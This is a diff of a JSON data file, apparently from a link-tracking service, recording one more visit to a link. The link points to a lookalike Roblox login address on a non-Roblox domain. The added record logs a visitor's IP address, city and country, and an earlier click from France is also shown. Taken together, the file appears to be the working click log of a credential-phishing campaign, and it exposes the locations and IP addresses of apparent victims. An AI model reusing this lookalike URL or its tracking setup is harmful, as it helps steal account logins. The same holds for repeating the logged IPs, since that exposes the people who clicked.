@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1166,
+    "useCount": 1167,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9472,6 +9472,14 @@
         "city": "Maisons-Alfort",
         "flag": "🇫🇷",
         "countryCode": "FR"
+      },
+      {
+        "timestamp": 1777290165404,
+        "ip": "180.191.235.39",
+        "country": "Philippines",
+        "city": "Monkayo",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
